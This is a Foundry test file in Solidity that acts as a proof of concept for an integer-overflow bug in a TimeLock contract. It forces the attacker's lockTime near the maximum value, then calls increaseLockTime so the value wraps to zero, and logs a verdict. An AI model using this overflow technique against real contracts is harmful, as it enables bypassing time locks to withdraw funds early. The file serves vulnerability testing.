// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/timelock.sol";

contract TimeLockOverflowTest is Test {
    TimeLock public timeLock;
    address owner = makeAddr("owner");
    address attacker = makeAddr("attacker");
    uint256 constant MAPPING_SLOT = 1; // Assumed storage slot for lockTime mapping

    function setUp() public {
        vm.prank(owner);
        timeLock = new TimeLock();
    }

    function test_IncreateLockTimeOverflow() public {
        // Compute storage location for attacker's lockTime
        bytes32 storageLocation = keccak256(
            abi.encode(uint256(uint160(attacker)), MAPPING_SLOT)
        );
        
        // Set initial lockTime to max(uint256) - 1
        uint256 initialValue = type(uint256).max - 1;
        vm.store(address(timeLock), storageLocation, bytes32(initialValue));

        console2.log("--- BEFORE-Trigger LockTime ---");
        // Using getter instead of storage access
        uint256 lockTimeBefore = timeLock.lockTime(attacker);
        console2.log("Initial lockTime for attacker:", lockTimeBefore);

        console2.log("--- Trigger increaseLockTime (overflow attack) ---");
        // Trigger overflow vulnerability
        vm.prank(attacker);
        timeLock.increaseLockTime(2); // Causes: (max-1) + 2 → 0 (overflow)

        console2.log("--- AFTER-Trigger LockTime ---");
        // Using getter again for comparison
        uint256 lockTimeAfter = timeLock.lockTime(attacker);
        console2.log("LockTime for attacker after attack:", lockTimeAfter);

        // Vulnerability verification
        if (lockTimeAfter == 0) {
            console2.log("Verdict: lockTime changed from", lockTimeBefore, "to 0 - Vulnerability exploited");
            console2.log("Vulnerability Exists: attacker successfully overflowed lockTime to zero");
        } else {
            console2.log("Verdict: lockTime remains at", lockTimeAfter, "- No overflow occurred");
            console2.log("Vulnerability not Exist: lockTime overflow did not occur as expected");
        }
    }
}